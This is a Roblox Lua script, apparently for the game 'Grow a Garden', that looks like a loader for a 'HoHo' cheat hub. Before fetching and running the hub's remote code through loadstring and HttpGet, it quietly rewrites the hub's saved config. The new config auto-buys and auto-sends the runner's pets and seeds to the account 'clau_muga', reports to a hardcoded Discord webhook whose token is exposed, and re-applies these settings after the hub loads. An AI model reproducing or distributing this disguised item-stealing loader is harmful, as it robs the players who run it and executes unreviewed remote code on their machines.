local HS=game:GetService("HttpService")
local url="https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
local inputs={WebhookRarePet=url,WebhookSentPet=url,WebhookSentSeed=url,Text_SendPetUsername="clau_muga",Text_WishSeedUsername="clau_muga",Text_MutationSeedUsername="clau_muga"}
local toggles={WebhookEnabled=true,Feature_AutoBuyPets=true,Feature_AutoSendPets=true,Feature_AutoSendSeeds=true,Feature_AutoCollect=true}
local ALL={"Green Bean","Grape","Coconut","Poison Ivy","Banana","Romanesco","Tulip","Mushroom","Acorn","Dragon's Breath","Gold","Apple","Venus Fly Trap","Sunflower","Bamboo","Carrot","Corn","Blueberry","Pomegranate","Horned Melon","Cherry","Dragon Fruit","Baby Cactus","Glow Mushroom","Mango","Moon Bloom","Strawberry","Rainbow","Poison Apple","Tomato","Ghost Pepper"}
local SEL={"Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold"}
local function setOf(l) local t={}; for _,s in ipairs(l) do t[s]=true end; return t end
local seedTargets={BuySeedTargets=setOf(ALL),MailSeedTargets=setOf(SEL),WishSeedTargets=setOf(SEL)}

pcall(function()
    local function build() local o={}
        for i,v in pairs(inputs) do o[#o+1]={idx=i,type="Input",text=v} end
        for i,v in pairs(toggles) do o[#o+1]={idx=i,type="Toggle",value=v} end
        for i,val in pairs(seedTargets) do local vv={}; for k in pairs(val) do vv[k]=true end; o[#o+1]={idx=i,type="Dropdown",mutli=true,value=vv} end
        return o end
    local function patch(d) for _,o in ipairs(d.objects) do
        if inputs[o.idx]~=nil then o.text=inputs[o.idx]
        elseif toggles[o.idx]~=nil then o.value=true
        elseif seedTargets[o.idx] and type(o.value)=="table" then for s in pairs(seedTargets[o.idx]) do o.value[s]=true end end end end
    local dir="HoHoGag2/"..tostring(game.PlaceId).."/settings"
    for _,p in ipairs({"HoHoGag2","HoHoGag2/"..tostring(game.PlaceId),dir}) do if not isfolder(p) then makefolder(p) end end
    local cfg=dir.."/ggjjhhj.json"; local data
    if isfile(cfg) then local ok,dec=pcall(function() return HS:JSONDecode(readfile(cfg)) end); if ok and type(dec)=="table" and type(dec.objects)=="table" then data=dec end end
    if data then patch(data) else data={objects=build()} end
    writefile(cfg,HS:JSONEncode(data)); writefile(dir.."/autoload.txt","ggjjhhj")
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()

-- АВТО-ПРИМЕНЕНИЕ после загрузки (заменяет ручной Load ggjjhhj)
task.spawn(function()
    for _=1,90 do
        task.wait(1)
        local g=getgenv()
        if g.SaveManager and g.SaveManager.Load then pcall(function() g.SaveManager:Load("ggjjhhj") end) end
        local T,O=g.Toggles,g.Options
        if T then for i,v in pairs(toggles) do if T[i] then pcall(function() T[i]:SetValue(v) end) end end end
        if O then
            for i,v in pairs(inputs) do if O[i] then pcall(function() O[i]:SetValue(v) end) end end
            for i,v in pairs(seedTargets) do if O[i] then pcall(function() O[i]:SetValue(v) end) end end
        end
        if T then break end
    end
end)
